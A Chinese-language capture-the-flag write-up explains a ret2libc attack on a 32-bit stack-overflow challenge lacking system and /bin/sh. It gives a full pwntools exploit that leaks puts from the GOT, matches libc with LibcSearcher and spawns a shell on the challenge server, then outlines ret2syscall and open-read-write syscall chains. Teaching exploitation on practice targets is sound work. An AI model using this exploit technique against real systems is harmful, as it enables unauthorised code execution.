---
title: "32 位无 system 无 /bin/sh 的利用方式"
created: 2026-10-27
tags: ["CTF", "Pwn", "ret2libc", "栈溢出"]
---

## 题目信息

拿到附件后，先查看程序的基本信息：

![[no-system-checksec.png|file 与 checksec 检查结果]]

保护机制分析：
- **No PIE**：程序基址固定，函数地址已知
- **NX enabled**：栈不可执行，需用 ROP
- **No canary**：无栈保护，可直接溢出
- **Partial RELRO**：GOT 表可写
- 32 位程序参数通过栈传递，ROP 链构造比 64 位简单，不需要寻找 pop gadget

## 漏洞分析

用 IDA 打开程序，main 函数的反编译代码如下：

![[no-system-ida-main.png|main 函数反编译代码]]

程序逻辑很简单：初始化、打印 logo 之后调用 `ctfshow()`，漏洞点就在 `ctfshow()` 函数中，存在典型的栈溢出。

不过在程序中搜索后发现：既没有导入 `system` 函数，也没有 `/bin/sh` 字符串，因此无法直接构造 `system("/bin/sh")`。

## 利用思路

基于此处的栈溢出，最简单的方式就是先用栈溢出泄露 libc 基址，再从 libc 中拿到 `system` 和 `/bin/sh`：

1. **第一次溢出**：返回到 `puts@plt`，输出 `puts` 的 GOT 表项（即 `puts` 在 libc 中的真实地址），随后返回 `main`，再次获得输入机会
2. **确定 libc**：用 LibcSearcher 根据 `puts` 的低 12 位偏移匹配 libc 版本，计算 libc 基址，进而得到 `system` 与 `/bin/sh` 的地址
3. **第二次溢出**：执行 `system("/bin/sh")` 拿到 shell

## 完整 EXP

```python
from pwn import *
from LibcSearcher import *

context(arch="i386", os="linux", log_level="debug")
# io = process("./pwn")
io = remote("pwn.challenge.ctf.show", 28146)

elf = ELF("./pwn")
puts_plt = elf.plt["puts"]
main_addr = elf.sym["main"]
puts_got = elf.got["puts"]

# 第一段 payload：溢出后调用 puts 泄露 libc 地址，再返回 main
payload1 = flat([b"A" * (0x6B + 4), puts_plt, main_addr, puts_got])
io.sendline(payload1)

# 32 位 libc 地址最高字节固定为 0xf7，收到后向前取 4 字节解包
leak = u32(io.recvuntil(b"\xf7")[-4:])
log.success("leak = " + hex(leak))

# 根据泄露地址确定 libc 版本并计算基址
libc = LibcSearcher("puts", leak)
libc_base = leak - libc.dump("puts")
system = libc_base + libc.dump("system")
binsh = libc_base + libc.dump("str_bin_sh")

# 第二段 payload：执行 system("/bin/sh")
payload2 = flat([b"A" * (0x6B + 4), system, main_addr, binsh])
io.sendline(payload2)

io.interactive()
```

## 细节说明

关于这份 exp，有几点需要说明：

1. **puts 与 write 的选择**：文件中同时导入 `puts` 和 `write` 时，用 `puts` 更简单——只需要一个参数，不用再额外构造传参。

2. **LibcSearcher 的使用**：这道题没有给 libc 文件，所以采用 LibcSearcher 在线匹配；如果题目附带 libc，计算基址那一步可以直接写成 `libc_base = leak - libc.symbols["puts"]`。

3. **`recvuntil(b"\xf7")` 的原理**：32 位 libc 地址的最高字节固定为 0xf7，收到该字节后向前取 4 字节，`u32` 解包即为泄露的地址。注意这里要使用 bytes 而不是字符串，避免触发类型警告。

4. **返回 main 后的输出干扰**：返回 main 之后、发送 payload 之前，程序可能先输出一些字符串（比如本题的 `puts("O.o?")`），必要时加一个 `recvuntil` 过渡，避免干扰后续接收。

## 延伸扩展

无 system 的情况下，除了 ret2libc 还有以下思路。

### 静态链接：ret2syscall

静态链接的题目可以采用 ret2syscall（代码量大，gadget 多）。

**32 位 execve 系统调用**：

- `eax = 0xb`（execve 调用号）
- `ebx = /bin/sh 地址`
- `ecx = 0`
- `edx = 0`
- `int 0x80`

**64 位 execve 系统调用**：

- `rax = 0x3b`
- `rdi = /bin/sh 地址`
- `rsi = 0`
- `rdx = 0`
- `syscall`

如果二进制里没有 `/bin/sh` 字符串，可以用 `read(0, bss, 8)` 自己写入。

### ORW

当 seccomp 禁掉 `execve` 时，直接读 flag 文件：

| 函数 | 调用号(32位/64位) | 参数1 | 参数2 | 参数3 |
|---|---|---|---|---|
| open | 5 / 2 | 文件名 | flags(0=只读) | mode |
| read | 3 / 0 | fd | buf | 字节数 |
| write | 4 / 1 | fd(1=屏幕) | buf | 字节数 |

- **fd 传递**：`open` 返回的 fd 在 `rax`，而 `read` 需要 fd 在 `rdi`，必须用 `mov rdi, rax` 类 gadget 传递。
- **为什么每步都要 syscall**：`syscall`/`int 0x80` 是触发系统调用的指令，不执行就只是布置了寄存器，什么也不会发生。每个系统调用都要单独触发一次。

### 泄露函数对比

| 函数 | 优点 | 缺点 | 适用场景 |
|---|---|---|---|
| puts | 只需 1 参数，简单 | 遇 `\x00` 截断 | 32 位首选 |
| write | 定长输出不怕截断，可批量泄露 | 需 3 参数，gadget 多 | 64 位/多函数泄露 |
| printf | 格式化字符串漏洞首选 | 普通 ROP 跟 puts 一样截断 | 格式化字符串漏洞 |
| read | 不能泄露（输入函数） | — | — |

**经验**：32 位用 puts，64 位用 write，格式化字符串用 printf。
